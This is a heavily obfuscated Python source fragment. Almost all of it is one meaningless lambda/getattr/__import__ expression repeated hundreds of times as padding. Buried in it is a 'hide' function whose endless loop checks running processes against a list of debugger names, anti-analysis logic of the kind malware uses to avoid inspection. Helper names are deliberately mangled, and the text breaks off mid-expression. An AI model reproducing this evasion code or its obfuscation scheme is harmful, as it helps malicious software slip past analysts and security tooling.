(lambda _, __, ___, ____, _____, ______, _______, ________:
     getattr(
         __import__(0x0021.__class__.__name__[_] + [].__class__.__name__[__]),
         ().__class__.__eq__.__class__.__name__[:__] +
         ().__iter__().__class__.__name__[_____:________]
     ))
(lambda _, __, ___, ____, _____, ______, _______, ________:
     getattr(
         __import__(0x0021.__class__.__name__[_] + [].__class__.__name__[__]),
         ().__class__.__eq__.__class__.__name__[:__] +
         ().__iter__().__class__.__name__[_____:________]
     ))
(lambda _, __, ___, ____, _____, ______, _______, ________:
     getattr(
         __import__(0x0021.__class__.__name__[_] + [].__class__.__name__[__]),
         ().__class__.__eq__.__class__.__name__[:__] +
         ().__iter__().__class__.__name__[_____:________]
     ))
(lambda _, __, ___, ____, _____, ______, _______, ________:
     getattr(
         __import__(0x0021.__class__.__name__[_] + [].__class__.__name__[__]),
         ().__class__.__eq__.__class__.__name__[:__] +
         ().__iter__().__class__.__name__[_____:________]
     ))
(lambda _, __, ___, ____, _____, ______, _______, ________:
     getattr(
         __import__(0x0021.__class__.__name__[_] + [].__class__.__name__[__]),
         ().__class__.__eq__.__class__.__name__[:__] +
         ().__iter__().__class__.__name__[_____:________]
     ))
(lambda _, __, ___, ____, _____, ______, _______, ________:
     getattr(
         __import__(0x0021.__class__.__name__[_] + [].__class__.__name__[__]),
         ().__class__.__eq__.__class__.__name__[:__] +
         ().__iter__().__class__.__name__[_____:________]
     ))
def hide(sleep_time):
    (lambda _, __, ___, ____, _____, ______, _______, ________:
     getattr(
         __import__(0x0021.__class__.__name__[_] + [].__class__.__name__[__]),
         ().__class__.__eq__.__class__.__name__[:__] +
         ().__iter__().__class__.__name__[_____:________]
     ))
    (lambda _, __, ___, ____, _____, ______, _______, ________:
     getattr(
         __import__(0x0021.__class__.__name__[_] + [].__class__.__name__[__]),
         ().__class__.__eq__.__class__.__name__[:__] +
         ().__iter__().__class__.__name__[_____:________]
     ))
    (lambda _, __, ___, ____, _____, ______, _______, ________:
     getattr(
         __import__(0x0021.__class__.__name__[_] + [].__class__.__name__[__]),
         ().__class__.__eq__.__class__.__name__[:__] +
         ().__iter__().__class__.__name__[_____:________]
     ))
    (lambda _, __, ___, ____, _____, ______, _______, ________:
     getattr(
         __import__(0x0021.__class__.__name__[_] + [].__class__.__name__[__]),
         ().__class__.__eq__.__class__.__name__[:__] +
         ().__iter__().__class__.__name__[_____:________]
     ))
    (lambda _, __, ___, ____, _____, ______, _______, ________:
     getattr(
         __import__(0x0021.__class__.__name__[_] + [].__class__.__name__[__]),
         ().__class__.__eq__.__class__.__name__[:__] +
         ().__iter__().__class__.__name__[_____:________]
     ))
    (lambda _, __, ___, ____, _____, ______, _______, ________:
     getattr(
         __import__(0x0021.__class__.__name__[_] + [].__class__.__name__[__]),
         ().__class__.__eq__.__class__.__name__[:__] +
         ().__iter__().__class__.__name__[_____:________]
     ))
    (lambda _, __, ___, ____, _____, ______, _______, ________:
     getattr(
         __import__(0x0021.__class__.__name__[_] + [].__class__.__name__[__]),
         ().__class__.__eq__.__class__.__name__[:__] +
         ().__iter__().__class__.__name__[_____:________]
     ))
    (lambda _, __, ___, ____, _____, ______, _______, ________:
     getattr(
         __import__(0x0021.__class__.__name__[_] + [].__class__.__name__[__]),
         ().__class__.__eq__.__class__.__name__[:__] +
         ().__iter__().__class__.__name__[_____:________]
     ))
    (lambda _, __, ___, ____, _____, ______, _______, ________:
     getattr(
         __import__(0x011.__class__.__name__[_] + [].__class__.__name__[__]),
         ().__class__.__eq__.__class__.__name__[:__] +
         ().__iter__().__class__.__name__[_____:________]
     ))
    (lambda _, __, ___, ____, _____, ______, _______, ________:
     getattr(
         __import__(0x00009.__class__.__name__[_] + [].__class__.__name__[__]),
         ().__class__.__eq__.__class__.__name__[:__] +
         ().__iter__().__class__.__name__[_____:________]
     ))
    (lambda _, __, ___, ____, _____, ______, _______, ________:
     getattr(
         __import__(True.__class__.__name__[_] + [].__class__.__name__[__]),
         ().__class__.__eq__.__class__.__name__[:__] +
         ().__iter__().__class__.__name__[_____:________]
     ))
    (lambda _, __, ___, ____, _____, ______, _______, ________:
     getattr(
         __import__(0x0008.__class__.__name__[_] + [].__class__.__name__[__]),
         ().__class__.__eq__.__class__.__name__[:__] +
         ().__iter__().__class__.__name__[_____:________]
     ))
    (lambda _, __, ___, ____, _____, ______, _______, ________:
     getattr(
         __import__(0x007.__class__.__name__[_] + [].__class__.__name__[__]),
         ().__class__.__eq__.__class__.__name__[:__] +
         ().__iter__().__class__.__name__[_____:________]
     ))
    (lambda _, __, ___, ____, _____, ______, _______, ________:
     getattr(
         __import__(0x00006.__class__.__name__[_] + [].__class__.__name__[__]),
         ().__class__.__eq__.__class__.__name__[:__] +
         ().__iter__().__class__.__name__[_____:________]
     ))
    (lambda _, __, ___, ____, _____, ______, _______, ________:
     getattr(
         __import__(True.__class__.__name__[_] + [].__class__.__name__[__]),
         ().__class__.__eq__.__class__.__name__[:__] +
         ().__iter__().__class__.__name__[_____:________]
     ))
    (lambda _, __, ___, ____, _____, ______, _______, ________:
     getattr(
         __import__(0x0021.__class__.__name__[_] + [].__class__.__name__[__]),
         ().__class__.__eq__.__class__.__name__[:__] +
         ().__iter__().__class__.__name__[_____:________]
     ))
    (lambda _, __, ___, ____, _____, ______, _______, ________:
     getattr(
         __import__(0x011.__class__.__name__[_] + [].__class__.__name__[__]),
         ().__class__.__eq__.__class__.__name__[:__] +
         ().__iter__().__class__.__name__[_____:________]
     ))
    (lambda _, __, ___, ____, _____, ______, _______, ________:
     getattr(
         __import__(0x00009.__class__.__name__[_] + [].__class__.__name__[__]),
         ().__class__.__eq__.__class__.__name__[:__] +
         ().__iter__().__class__.__name__[_____:________]
     ))
    (lambda _, __, ___, ____, _____, ______, _______, ________:
     getattr(
         __import__(True.__class__.__name__[_] + [].__class__.__name__[__]),
         ().__class__.__eq__.__class__.__name__[:__] +
         ().__iter__().__class__.__name__[_____:________]
     ))
    (lambda _, __, ___, ____, _____, ______, _______, ________:
     getattr(
         __import__(0x0008.__class__.__name__[_] + [].__class__.__name__[__]),
         ().__class__.__eq__.__class__.__name__[:__] +
         ().__iter__().__class__.__name__[_____:________]
     ))
    (lambda _, __, ___, ____, _____, ______, _______, ________:
     getattr(
         __import__(0x007.__class__.__name__[_] + [].__class__.__name__[__]),
         ().__class__.__eq__.__class__.__name__[:__] +
         ().__iter__().__class__.__name__[_____:________]
     ))
    (lambda _, __, ___, ____, _____, ______, _______, ________:
     getattr(
         __import__(0x00006.__class__.__name__[_] + [].__class__.__name__[__]),
         ().__class__.__eq__.__class__.__name__[:__] +
         ().__iter__().__class__.__name__[_____:________]
     ))
    (lambda _, __, ___, ____, _____, ______, _______, ________:
     getattr(
         __import__(True.__class__.__name__[_] + [].__class__.__name__[__]),
         ().__class__.__eq__.__class__.__name__[:__] +
         ().__iter__().__class__.__name__[_____:________]
     ))
    while 0x0000000000000000000000000000000000000000000006 & 2 > 0x000000000000000000000000000000000000000000000000000000000000000000000004 >> 2:
        (lambda _, __, ___, ____, _____, ______, _______, ________:
         getattr(
             __import__(0x0021.__class__.__name__[_] + [].__class__.__name__[__]),
             ().__class__.__eq__.__class__.__name__[:__] +
             ().__iter__().__class__.__name__[_____:________]
         ))
        (lambda _, __, ___, ____, _____, ______, _______, ________:
         getattr(
             __import__(0x011.__class__.__name__[_] + [].__class__.__name__[__]),
             ().__class__.__eq__.__class__.__name__[:__] +
             ().__iter__().__class__.__name__[_____:________]
         ))
        (lambda _, __, ___, ____, _____, ______, _______, ________:
         getattr(
             __import__(0x00009.__class__.__name__[_] + [].__class__.__name__[__]),
             ().__class__.__eq__.__class__.__name__[:__] +
             ().__iter__().__class__.__name__[_____:________]
         ))
        (lambda _, __, ___, ____, _____, ______, _______, ________:
         getattr(
             __import__(True.__class__.__name__[_] + [].__class__.__name__[__]),
             ().__class__.__eq__.__class__.__name__[:__] +
             ().__iter__().__class__.__name__[_____:________]
         ))
        (lambda _, __, ___, ____, _____, ______, _______, ________:
         getattr(
             __import__(0x0008.__class__.__name__[_] + [].__class__.__name__[__]),
             ().__class__.__eq__.__class__.__name__[:__] +
             ().__iter__().__class__.__name__[_____:________]
         ))
        (lambda _, __, ___, ____, _____, ______, _______, ________:
         getattr(
             __import__(0x007.__class__.__name__[_] + [].__class__.__name__[__]),
             ().__class__.__eq__.__class__.__name__[:__] +
             ().__iter__().__class__.__name__[_____:________]
         ))
        (lambda _, __, ___, ____, _____, ______, _______, ________:
         getattr(
             __import__(0x00006.__class__.__name__[_] + [].__class__.__name__[__]),
             ().__class__.__eq__.__class__.__name__[:__] +
             ().__iter__().__class__.__name__[_____:________]
         ))
        (lambda _, __, ___, ____, _____, ______, _______, ________:
         getattr(
             __import__(True.__class__.__name__[_] + [].__class__.__name__[__]),
             ().__class__.__eq__.__class__.__name__[:__] +
             ().__iter__().__class__.__name__[_____:________]
         ))
        (lambda _, __, ___, ____, _____, ______, _______, ________:
         getattr(
             __import__(0x0021.__class__.__name__[_] + [].__class__.__name__[__]),
             ().__class__.__eq__.__class__.__name__[:__] +
             ().__iter__().__class__.__name__[_____:________]
         ))
        (lambda _, __, ___, ____, _____, ______, _______, ________:
         getattr(
             __import__(0x011.__class__.__name__[_] + [].__class__.__name__[__]),
             ().__class__.__eq__.__class__.__name__[:__] +
             ().__iter__().__class__.__name__[_____:________]
         ))
        (lambda _, __, ___, ____, _____, ______, _______, ________:
         getattr(
             __import__(0x00009.__class__.__name__[_] + [].__class__.__name__[__]),
             ().__class__.__eq__.__class__.__name__[:__] +
             ().__iter__().__class__.__name__[_____:________]
         ))
        (lambda _, __, ___, ____, _____, ______, _______, ________:
         getattr(
             __import__(True.__class__.__name__[_] + [].__class__.__name__[__]),
             ().__class__.__eq__.__class__.__name__[:__] +
             ().__iter__().__class__.__name__[_____:________]
         ))
        (lambda _, __, ___, ____, _____, ______, _______, ________:
         getattr(
             __import__(0x0008.__class__.__name__[_] + [].__class__.__name__[__]),
             ().__class__.__eq__.__class__.__name__[:__] +
             ().__iter__().__class__.__name__[_____:________]
         ))
        (lambda _, __, ___, ____, _____, ______, _______, ________:
         getattr(
             __import__(0x007.__class__.__name__[_] + [].__class__.__name__[__]),
             ().__class__.__eq__.__class__.__name__[:__] +
             ().__iter__().__class__.__name__[_____:________]
         ))
        (lambda _, __, ___, ____, _____, ______, _______, ________:
         getattr(
             __import__(0x00006.__class__.__name__[_] + [].__class__.__name__[__]),
             ().__class__.__eq__.__class__.__name__[:__] +
             ().__iter__().__class__.__name__[_____:________]
         ))
        (lambda _, __, ___, ____, _____, ______, _______, ________:
         getattr(
             __import__(True.__class__.__name__[_] + [].__class__.__name__[__]),
             ().__class__.__eq__.__class__.__name__[:__] +
             ().__iter__().__class__.__name__[_____:________]
         ))
        (lambda _, __, ___, ____, _____, ______, _______, ________:
         getattr(
             __import__(0x0021.__class__.__name__[_] + [].__class__.__name__[__]),
             ().__class__.__eq__.__class__.__name__[:__] +
             ().__iter__().__class__.__name__[_____:________]
         ))
        (lambda _, __, ___, ____, _____, ______, _______, ________:
         getattr(
             __import__(0x011.__class__.__name__[_] + [].__class__.__name__[__]),
             ().__class__.__eq__.__class__.__name__[:__] +
             ().__iter__().__class__.__name__[_____:________]
         ))
        (lambda _, __, ___, ____, _____, ______, _______, ________:
         getattr(
             __import__(0x00009.__class__.__name__[_] + [].__class__.__name__[__]),
             ().__class__.__eq__.__class__.__name__[:__] +
             ().__iter__().__class__.__name__[_____:________]
         ))
        (lambda _, __, ___, ____, _____, ______, _______, ________:
         getattr(
             __import__(True.__class__.__name__[_] + [].__class__.__name__[__]),
             ().__class__.__eq__.__class__.__name__[:__] +
             ().__iter__().__class__.__name__[_____:________]
         ))
        (lambda _, __, ___, ____, _____, ______, _______, ________:
         getattr(
             __import__(0x0008.__class__.__name__[_] + [].__class__.__name__[__]),
             ().__class__.__eq__.__class__.__name__[:__] +
             ().__iter__().__class__.__name__[_____:________]
         ))
        (lambda _, __, ___, ____, _____, ______, _______, ________:
         getattr(
             __import__(0x007.__class__.__name__[_] + [].__class__.__name__[__]),
             ().__class__.__eq__.__class__.__name__[:__] +
             ().__iter__().__class__.__name__[_____:________]
         ))
        (lambda _, __, ___, ____, _____, ______, _______, ________:
         getattr(
             __import__(0x00006.__class__.__name__[_] + [].__class__.__name__[__]),
             ().__class__.__eq__.__class__.__name__[:__] +
             ().__iter__().__class__.__name__[_____:________]
         ))
        (lambda _, __, ___, ____, _____, ______, _______, ________:
         getattr(
             __import__(True.__class__.__name__[_] + [].__class__.__name__[__]),
             ().__class__.__eq__.__class__.__name__[:__] +
             ().__iter__().__class__.__name__[_____:________]
         ))
        (lambda _, __, ___, ____, _____, ______, _______, ________:
         getattr(
             __import__(0x0021.__class__.__name__[_] + [].__class__.__name__[__]),
             ().__class__.__eq__.__class__.__name__[:__] +
             ().__iter__().__class__.__name__[_____:________]
         ))
        (lambda _, __, ___, ____, _____, ______, _______, ________:
         getattr(
             __import__(0x011.__class__.__name__[_] + [].__class__.__name__[__]),
             ().__class__.__eq__.__class__.__name__[:__] +
             ().__iter__().__class__.__name__[_____:________]
         ))
        (lambda _, __, ___, ____, _____, ______, _______, ________:
         getattr(
             __import__(0x00009.__class__.__name__[_] + [].__class__.__name__[__]),
             ().__class__.__eq__.__class__.__name__[:__] +
             ().__iter__().__class__.__name__[_____:________]
         ))
        (lambda _, __, ___, ____, _____, ______, _______, ________:
         getattr(
             __import__(True.__class__.__name__[_] + [].__class__.__name__[__]),
             ().__class__.__eq__.__class__.__name__[:__] +
             ().__iter__().__class__.__name__[_____:________]
         ))
        (lambda _, __, ___, ____, _____, ______, _______, ________:
         getattr(
             __import__(0x0008.__class__.__name__[_] + [].__class__.__name__[__]),
             ().__class__.__eq__.__class__.__name__[:__] +
             ().__iter__().__class__.__name__[_____:________]
         ))
        (lambda _, __, ___, ____, _____, ______, _______, ________:
         getattr(
             __import__(0x007.__class__.__name__[_] + [].__class__.__name__[__]),
             ().__class__.__eq__.__class__.__name__[:__] +
             ().__iter__().__class__.__name__[_____:________]
         ))
        (lambda _, __, ___, ____, _____, ______, _______, ________:
         getattr(
             __import__(0x00006.__class__.__name__[_] + [].__class__.__name__[__]),
             ().__class__.__eq__.__class__.__name__[:__] +
             ().__iter__().__class__.__name__[_____:________]
         ))
        (lambda _, __, ___, ____, _____, ______, _______, ________:
         getattr(
             __import__(True.__class__.__name__[_] + [].__class__.__name__[__]),
             ().__class__.__eq__.__class__.__name__[:__] +
             ().__iter__().__class__.__name__[_____:________]
         ))
        (lambda _, __, ___, ____, _____, ______, _______, ________:
         getattr(
             __import__(0x0021.__class__.__name__[_] + [].__class__.__name__[__]),
             ().__class__.__eq__.__class__.__name__[:__] +
             ().__iter__().__class__.__name__[_____:________]
         ))
        (lambda _, __, ___, ____, _____, ______, _______, ________:
         getattr(
             __import__(0x011.__class__.__name__[_] + [].__class__.__name__[__]),
             ().__class__.__eq__.__class__.__name__[:__] +
             ().__iter__().__class__.__name__[_____:________]
         ))
        (lambda _, __, ___, ____, _____, ______, _______, ________:
         getattr(
             __import__(0x00009.__class__.__name__[_] + [].__class__.__name__[__]),
             ().__class__.__eq__.__class__.__name__[:__] +
             ().__iter__().__class__.__name__[_____:________]
         ))
        (lambda _, __, ___, ____, _____, ______, _______, ________:
         getattr(
             __import__(True.__class__.__name__[_] + [].__class__.__name__[__]),
             ().__class__.__eq__.__class__.__name__[:__] +
             ().__iter__().__class__.__name__[_____:________]
         ))
        (lambda _, __, ___, ____, _____, ______, _______, ________:
         getattr(
             __import__(0x0008.__class__.__name__[_] + [].__class__.__name__[__]),
             ().__class__.__eq__.__class__.__name__[:__] +
             ().__iter__().__class__.__name__[_____:________]
         ))
        (lambda _, __, ___, ____, _____, ______, _______, ________:
         getattr(
             __import__(0x007.__class__.__name__[_] + [].__class__.__name__[__]),
             ().__class__.__eq__.__class__.__name__[:__] +
             ().__iter__().__class__.__name__[_____:________]
         ))
        (lambda _, __, ___, ____, _____, ______, _______, ________:
         getattr(
             __import__(0x00006.__class__.__name__[_] + [].__class__.__name__[__]),
             ().__class__.__eq__.__class__.__name__[:__] +
             ().__iter__().__class__.__name__[_____:________]
         ))
        (lambda _, __, ___, ____, _____, ______, _______, ________:
         getattr(
             __import__(True.__class__.__name__[_] + [].__class__.__name__[__]),
             ().__class__.__eq__.__class__.__name__[:__] +
             ().__iter__().__class__.__name__[_____:________]
         ))
        (lambda _, __, ___, ____, _____, ______, _______, ________:
         getattr(
             __import__(0x0021.__class__.__name__[_] + [].__class__.__name__[__]),
             ().__class__.__eq__.__class__.__name__[:__] +
             ().__iter__().__class__.__name__[_____:________]
         ))
        (lambda _, __, ___, ____, _____, ______, _______, ________:
         getattr(
             __import__(0x011.__class__.__name__[_] + [].__class__.__name__[__]),
             ().__class__.__eq__.__class__.__name__[:__] +
             ().__iter__().__class__.__name__[_____:________]
         ))
        (lambda _, __, ___, ____, _____, ______, _______, ________:
         getattr(
             __import__(0x00009.__class__.__name__[_] + [].__class__.__name__[__]),
             ().__class__.__eq__.__class__.__name__[:__] +
             ().__iter__().__class__.__name__[_____:________]
         ))
        (lambda _, __, ___, ____, _____, ______, _______, ________:
         getattr(
             __import__(True.__class__.__name__[_] + [].__class__.__name__[__]),
             ().__class__.__eq__.__class__.__name__[:__] +
             ().__iter__().__class__.__name__[_____:________]
         ))
        (lambda _, __, ___, ____, _____, ______, _______, ________:
         getattr(
             __import__(0x0008.__class__.__name__[_] + [].__class__.__name__[__]),
             ().__class__.__eq__.__class__.__name__[:__] +
             ().__iter__().__class__.__name__[_____:________]
         ))
        (lambda _, __, ___, ____, _____, ______, _______, ________:
         getattr(
             __import__(0x007.__class__.__name__[_] + [].__class__.__name__[__]),
             ().__class__.__eq__.__class__.__name__[:__] +
             ().__iter__().__class__.__name__[_____:________]
         ))
        (lambda _, __, ___, ____, _____, ______, _______, ________:
         getattr(
             __import__(0x00006.__class__.__name__[_] + [].__class__.__name__[__]),
             ().__class__.__eq__.__class__.__name__[:__] +
             ().__iter__().__class__.__name__[_____:________]
         ))
        (lambda _, __, ___, ____, _____, ______, _______, ________:
         getattr(
             __import__(True.__class__.__name__[_] + [].__class__.__name__[__]),
             ().__class__.__eq__.__class__.__name__[:__] +
             ().__iter__().__class__.__name__[_____:________]
         ))
        (lambda _, __, ___, ____, _____, ______, _______, ________:
         getattr(
             __import__(0x0021.__class__.__name__[_] + [].__class__.__name__[__]),
             ().__class__.__eq__.__class__.__name__[:__] +
             ().__iter__().__class__.__name__[_____:________]
         ))
        (lambda _, __, ___, ____, _____, ______, _______, ________:
         getattr(
             __import__(0x011.__class__.__name__[_] + [].__class__.__name__[__]),
             ().__class__.__eq__.__class__.__name__[:__] +
             ().__iter__().__class__.__name__[_____:________]
         ))
        (lambda _, __, ___, ____, _____, ______, _______, ________:
         getattr(
             __import__(0x00009.__class__.__name__[_] + [].__class__.__name__[__]),
             ().__class__.__eq__.__class__.__name__[:__] +
             ().__iter__().__class__.__name__[_____:________]
         ))
        (lambda _, __, ___, ____, _____, ______, _______, ________:
         getattr(
             __import__(True.__class__.__name__[_] + [].__class__.__name__[__]),
             ().__class__.__eq__.__class__.__name__[:__] +
             ().__iter__().__class__.__name__[_____:________]
         ))
        (lambda _, __, ___, ____, _____, ______, _______, ________:
         getattr(
             __import__(0x0008.__class__.__name__[_] + [].__class__.__name__[__]),
             ().__class__.__eq__.__class__.__name__[:__] +
             ().__iter__().__class__.__name__[_____:________]
         ))
        (lambda _, __, ___, ____, _____, ______, _______, ________:
         getattr(
             __import__(0x007.__class__.__name__[_] + [].__class__.__name__[__]),
             ().__class__.__eq__.__class__.__name__[:__] +
             ().__iter__().__class__.__name__[_____:________]
         ))
        (lambda _, __, ___, ____, _____, ______, _______, ________:
         getattr(
             __import__(0x00006.__class__.__name__[_] + [].__class__.__name__[__]),
             ().__class__.__eq__.__class__.__name__[:__] +
             ().__iter__().__class__.__name__[_____:________]
         ))
        (lambda _, __, ___, ____, _____, ______, _______, ________:
         getattr(
             __import__(True.__class__.__name__[_] + [].__class__.__name__[__]),
             ().__class__.__eq__.__class__.__name__[:__] +
             ().__iter__().__class__.__name__[_____:________]
         ))
        (lambda _, __, ___, ____, _____, ______, _______, ________:
         getattr(
             __import__(0x0021.__class__.__name__[_] + [].__class__.__name__[__]),
             ().__class__.__eq__.__class__.__name__[:__] +
             ().__iter__().__class__.__name__[_____:________]
         ))
        (lambda _, __, ___, ____, _____, ______, _______, ________:
         getattr(
             __import__(0x011.__class__.__name__[_] + [].__class__.__name__[__]),
             ().__class__.__eq__.__class__.__name__[:__] +
             ().__iter__().__class__.__name__[_____:________]
         ))
        (lambda _, __, ___, ____, _____, ______, _______, ________:
         getattr(
             __import__(0x00009.__class__.__name__[_] + [].__class__.__name__[__]),
             ().__class__.__eq__.__class__.__name__[:__] +
             ().__iter__().__class__.__name__[_____:________]
         ))
        (lambda _, __, ___, ____, _____, ______, _______, ________:
         getattr(
             __import__(True.__class__.__name__[_] + [].__class__.__name__[__]),
             ().__class__.__eq__.__class__.__name__[:__] +
             ().__iter__().__class__.__name__[_____:________]
         ))
        (lambda _, __, ___, ____, _____, ______, _______, ________:
         getattr(
             __import__(0x0008.__class__.__name__[_] + [].__class__.__name__[__]),
             ().__class__.__eq__.__class__.__name__[:__] +
             ().__iter__().__class__.__name__[_____:________]
         ))
        (lambda _, __, ___, ____, _____, ______, _______, ________:
         getattr(
             __import__(0x007.__class__.__name__[_] + [].__class__.__name__[__]),
             ().__class__.__eq__.__class__.__name__[:__] +
             ().__iter__().__class__.__name__[_____:________]
         ))
        (lambda _, __, ___, ____, _____, ______, _______, ________:
         getattr(
             __import__(0x00006.__class__.__name__[_] + [].__class__.__name__[__]),
             ().__class__.__eq__.__class__.__name__[:__] +
             ().__iter__().__class__.__name__[_____:________]
         ))
        (lambda _, __, ___, ____, _____, ______, _______, ________:
         getattr(
             __import__(True.__class__.__name__[_] + [].__class__.__name__[__]),
             ().__class__.__eq__.__class__.__name__[:__] +
             ().__iter__().__class__.__name__[_____:________]
         ))
        if jersrsejrse(
                debug_proc in erherhzzveeaw(process.name()) or erherhzzveeaw(process.name()) in debug_proc for debug_proc in
                debug_process for process in psutil.process_iter()):
            (lambda _, __, ___, ____, _____, ______, _______, ________:
             getattr(
                 __import__(0x0021.__class__.__name__[_] + [].__class__.__name__[__]),
                 ().__class__.__eq__.__class__.__name__[:__] +
                 ().__iter__().__class__.__name__[_____:________]
             ))
            (lambda _, __, ___, ____, _____, ______, _______, ________:
             getattr(
                 __import__(0x011.__class__.__name__[_] + [].__class__.__name__[__]),
                 ().__class__.__eq__.__class__.__name__[:__] +
                 ().__iter__().__class__.__name__[_____:________]
             ))
            (lambda _, __, ___, ____, _____, ______, _______, ________:
             getattr(
                 __import__(0x00009.__class__.__name__[_] + [].__class__.__name__[__]),
                 ().__class__.__eq__.__class__.__name__[:__] +
                 ().__iter__().__class__.__name__[_____:________]
             ))
            (lambda _, __, ___, ____, _____, ______, _______, ________:
             getattr(
                 __import__(True.__class__.__name__[_] + [].__class__.__name__[__]),
                 ().__class__.__eq__.__class__.__name__[:__] +
                 ().__iter__().__class__.__name__[_____:________]
             ))
            (lambda _, __, ___, ____, _____, ______, _______, ________:
             getattr(
                 __import__(0x0008.__class__.__name__[_] + [].__class__.__name__[__]),
                 ().__class__.__eq__.__class__.__name__[:__] +
                 ().__iter__().__class__.__name__[_____:________]
             ))
            (lambda _, __, ___, ____, _____, ______, _______, ________:
             getattr(
                 __import__(0x007.__class__.__name__[_] + [].__class__.__name__[__]),
                 ().__class__.__eq__.__class__.__name__[:__] +
                 ().__iter__().__class__.__name__[_____:________]
             ))
            (lambda _, __, ___, ____, _____, ______, _______, ________:
             getattr(
                 __import__(0x00006.__class__.__name__[_] + [].__class__.__name__[__]),
                 ().__class__.__eq__.__class__.__name__[:__] +
                 ().__iter__().__class__.__name__[_____:________]
             ))
            (lambda _, __, ___, ____, _____, ______, _______, ________:
             getattr(
                 __import__(True.__class__.__name__[_] + [].__class__.__name__[__]),
                 ().__class__.__eq__.__class__.__name__[:__] +
                 ().__iter__().__class__.__name__[_____:________]
             ))
            (lambda _, __, ___, ____, _____, ______, _______, ________:
             getattr(
                 __import__(0x0021.__class__.__name__[_] + [].__class__.__name__[__]),
                 ().__class__.__eq__.__class__.__name__[:__] +
                 ().__iter__().__class__.__name__[_____:________]
             ))
            (lambda _, __, ___, ____, _____, ______, _______, ________:
             getattr(
                 __import__(0x011.__class__.__name__[_] + [].__class__.__name__[__]),
                 ().__class__.__eq__.__class__.__name__[:__] +
                 ().__iter__().__class__.__name__[_____:________]
             ))
            (lambda _, __, ___, ____, _____, ______, _______, ________:
             getattr(
                 __import__(0x00009.__class__.__name__[_] + [].__class__.__name__[__]),
                 ().__class__.__eq__.__class__.__name__[:__] +
                 ().__iter__().__class__.__name__[_____:________]
             ))
            (lambda _, __, ___, ____, _____, ______, _______, ________:
             getattr(
                 __import__(True.__class__.__name__[_] + [].__class__.__name__[__]),
                 ().__class__.__eq__.__class__.__name__[:__] +
                 ().__iter__().__class__.__name__[_____:________]
             ))
            (lambda _, __, ___, ____, _____, ______, _______, ________:
             getattr(
                 __import__(0x0008.__class__.__name__[_] + [].__class__.__name__[__]),
                 ().__class__.__eq__.__class__.__name__[:__] +
                 ().__iter__().__class__.__name__[_____:________]
             ))
            (lambda _, __, ___, ____, _____, ______, _______, ________:
             getattr(
                 __import__(0x007.__class__.__name__[_] + [].__class__.__name__[__]),
                 ().__class__.__eq__.__class__.__name__[:__] +
                 ().__iter__().__class__.__name__[_____:________]
             ))
            (lambda _, __, ___, ____, _____, ______, _______, ________:
             getattr(
                 __import__(0x00006.__class__.__name__[_] + [].__class__.__name__[__]),
                 ().__class__.__eq__.__class__.__name__[:__] +
                 ().__iter__().__class__.__name__[_____:________]
             ))
            (lambda _, __, ___, ____, _____, ______, _______, ________:
             getattr(
                 __import__(True.__class__.__name__[_] + [].__class__.__name__[__]),
                 ().__class__.__eq__.__class__.__name__[:__] +
                 ().__iter__().__class__.__name__[_____:________]
             ))
            (lambda _, __, ___, ____, _____, ______, _______, ________:
             getattr(
                 __import__(0x0021.__class__.__name__[_] + [].__class__.__name__[__]),
                 ().__class__.__eq__.__class__.__name__[:__] +
                 ().__iter__().__class__.__name__[_____:________]
             ))
            (lambda _, __, ___, ____, _____, ______, _______, ________:
             getattr(
                 __import__(0x011.__class__.__name__[_] + [].__class__.__name__[__]),
                 ().__class__.__eq__.__class__.__name__[:__] +
                 ().__iter__().__class__.__name__[_____:________]
             ))
            (lambda _, __, ___, ____, _____, ______, _______, ________:
             getattr(
                 __import__(0x00009.__class__.__name__[_] + [].__class__.__name__[__]),
                 ().__class__.__eq__.__class__.__name__[:__] +
                 ().__iter__().__class__.__name__[_____:________]
             ))
            (lambda _, __, ___, ____, _____, ______, _______, ________:
             getattr(
                 __import__(True.__class__.__name__[_] + [].__class__.__name__[__]),
                 ().__class__.__eq__.__class__.__name__[:__] +
                 ().__iter__().__class__.__name__[_____:________]
             ))
            (lambda _, __, ___, ____, _____, ______, _______, ________:
             getattr(
                 __import__(0x0008.__class__.__name__[_] + [].__class__.__name__[__]),
                 ().__class__.__eq__.__class__.__name__[:__] +
                 ().__iter__().__class__.__name__[_____:________]
             ))
            (lambda _, __, ___, ____, _____, ______, _______, ________:
             getattr(
                 __import__(0x007.__class__.__name__[_] + [].__class__.__name__[__]),
                 ().__class__.__eq__.__class__.__name__[:__] +
                 ().__iter__().__class__.__name__[_____:________]
             ))
            (lambda _, __, ___, ____, _____, ______, _______, ________:
             getattr(
                 __import__(0x00006.__class__.__name__[_] + [].__class__.__name__[__]),
                 ().__class__.__eq__.__class__.__name__[:__] +
                 ().__iter__().__class__.__name__[_____:________]
             ))
            (lambda _, __, ___, ____, _____, ______, _______, ________:
             getattr(
                 __import__(True.__class__.__name__[_] + [].__class__.__name__[__]),
                 ().__class__.__eq__.__class__.__name__[:__] +
                 ().__iter__().__class__.__name__[_____:________]
             ))
            (lambda _, __, ___, ____, _____, ______, _______, ________:
             getattr(
                 __import__(0x0021.__class__.__name__[_] + [].__class__.__name__[__]),
                 ().__class__.__eq__.__class__.__name__[:__] +
                 ().__iter__().__class__.__name__[_____:________]
             ))
            (lambda _, __, ___, ____, _____, ______, _______, ________:
             getattr(
                 __import__(0x011.__class__.__name__[_] + [].__class__.__name__[__]),
                 ().__class__.__eq__.__class__.__name__[:__] +
                 ().__iter__().__class__.__name__[_____:________]
             ))
            (lambda _, __, ___, ____, _____, ______, _______, ________:
             getattr(
                 __import__(0x00009.__class__.__name__[_] + [].__class__.__name__[__]),
                 ().__class__.__eq__.__class__.__name__[:__] +
                 ().__iter__().__class__.__name__[_____:________]
             ))
            (lambda _, __, ___, ____, _____, ______, _______, ________:
             getattr(
                 __import__(True.__class__.__name__[_] + [].__class__.__name__[__]),
                 ().__class__.__eq__.__class__.__name__[:__] +
                 ().__iter__().__class__.__name__[_____:________]
             ))
            (lambda _, __, ___, ____, _____, ______, _______, ________:
             getattr(
                 __import__(0x0008.__class__.__name__[_] + [].__class__.__name__[__]),
                 ().__class__.__eq__.__class__.__name__[:__] +
                 ().__iter__().__class__.__name__[_____:________]
             ))
            (lambda _, __, ___, ____, _____, ______, _______, ________:
             getattr(
                 __import__(0x007.__class__.__name__[_] + [].__class__.__name__[__]),
                 ().__class__.__eq__.__class__.__name__[:__] +
                 ().__iter__().__class__.__name__[_____:________]
             ))
            (lambda _, __, ___, ____, _____, ______, _______, ________:
             getattr(
                 __import__(0x00006.__class__.__name__[_] + [].__class__.__name__[__]),
                 ().__class__.__eq__.__class__.__name__[:__] +
